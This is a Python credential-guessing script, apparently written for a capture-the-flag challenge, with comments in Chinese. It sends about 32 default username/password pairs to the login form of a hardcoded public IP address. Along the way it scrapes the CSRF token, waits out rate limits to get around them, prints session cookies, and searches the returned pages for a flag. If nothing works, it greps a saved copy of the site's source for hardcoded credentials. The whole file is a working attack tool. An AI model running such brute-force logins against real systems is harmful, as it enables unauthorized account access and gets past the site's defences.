import requests
import re
import os
import time

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("等待速率限制解除（60秒）...")
print("="*70)

time.sleep(60)

print("\n开始登录测试...")

# 获取登录页面和CSRF
r = session.get(f"{TARGET}/login", timeout=15)
csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf_token = csrf.group(1) if csrf else ""

print(f"CSRF Token: {csrf_token}")

# 根据源码分析，可能需要特定的凭据
# 尝试一些可能的凭据
credentials = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "term3lab"),
    ("term3lab", "term3lab"),
    ("ctf", "ctf"),
    ("flag", "flag"),
    ("root", "root"),
    ("test", "test"),
    ("guest", "guest"),
    ("user", "user"),
    ("demo", "demo"),
    ("administrator", "administrator"),
    ("player", "player"),
    ("admin", "Admin123"),
    ("admin", "admin123"),
    ("admin", "qwerty"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("admin", "monkey"),
    ("admin", "dragon"),
    ("admin", "master"),
    ("admin", "login"),
    ("admin", "pass"),
    ("admin", "abc123"),
    ("admin", "111111"),
    ("admin", "123123"),
    ("admin", "adminadmin"),
    ("admin", "adminadmin123"),
    ("admin", "p@ssw0rd"),
    ("admin", "P@ssword"),
    ("admin", "Pa$$w0rd"),
]

found_login = False

for username, password in credentials:
    try:
        data = {"username": username, "password": password, "csrf": csrf_token}
        r = session.post(f"{TARGET}/login", data=data, timeout=15, allow_redirects=False)
        
        print(f"\n>>> {username}/{password}")
        print(f"状态码: {r.status_code}")
        
        # 检查重定向（登录成功通常会302重定向）
        if r.status_code in [302, 301]:
            print(f"⚠️ 有重定向！")
            print(f"重定向到: {r.headers.get('Location', '')}")
            
            # 获取重定向后的内容
            redirect_url = r.headers.get('Location', '')
            if redirect_url:
                # 设置新的session cookie
                for cookie in r.cookies:
                    print(f"Cookie: {cookie.name} = {cookie.value}")
                
                r2 = session.get(f"{TARGET}{redirect_url}", timeout=15)
                print(f"\n重定向页面内容:")
                print(f"状态码: {r2.status_code}")
                print(f"内容: {r2.text}")
                
                # 搜索flag
                flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
            
            found_login = True
            break
        
        # 检查是否有登录成功的标志（非重定向方式）
        if "用户名或密码错误" not in r.text:
            print(f"⚠️ 可能登录成功（无错误消息）!")
            print(f"响应内容: {r.text[:500]}")
            
            # 检查cookies
            print(f"Cookies: {session.cookies.get_dict()}")
            
            # 尝试访问控制台
            r2 = session.get(f"{TARGET}/dashboard", timeout=15)
            print(f"\n控制台内容:")
            print(f"状态码: {r2.status_code}")
            print(f"内容: {r2.text}")
            
            # 搜索flag
            flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
            
            found_login = True
            break
        
        # 检查是否有速率限制
        if r.status_code == 429:
            print(f"⚠️ 速率限制触发，等待60秒...")
            time.sleep(60)
            # 重新获取CSRF
            r = session.get(f"{TARGET}/login", timeout=15)
            csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
            csrf_token = csrf.group(1) if csrf else ""
        
        time.sleep(2)  # 避免速率限制
    except Exception as e:
        print(f"错误: {e}")
        time.sleep(5)

if not found_login:
    print("\n登录凭据未找到")
    
    # 检查是否有隐藏的凭据信息
    print("\n" + "="*70)
    print("检查源码中的隐藏信息")
    print("="*70)
    
    # 获取upload源码中的敏感信息
    with open("upload_source_full.txt", "r", encoding="utf-8") as f:
        source = f.read()
    
    # 搜索可能的用户名/密码提示
    user_patterns = re.findall(r'user[sn]ame["\']?\s*[=:]\s*["\']([^"\']+)["\']', source, re.IGNORECASE)
    pass_patterns = re.findall(r'pass[wo]?rd["\']?\s*[=:]\s*["\']([^"\']+)["\']', source, re.IGNORECASE)
    
    print(f"源码中的用户名模式: {user_patterns}")
    print(f"源码中的密码模式: {pass_patterns}")
    
    # 搜索可能的凭据硬编码
    hardcoded_creds = re.findall(r'(admin|root|user|guest|test)\s*[=:]\s*["\']([^"\']+)["\']', source, re.IGNORECASE)
    print(f"可能的硬编码凭据: {hardcoded_creds}")

print("\n测试完成")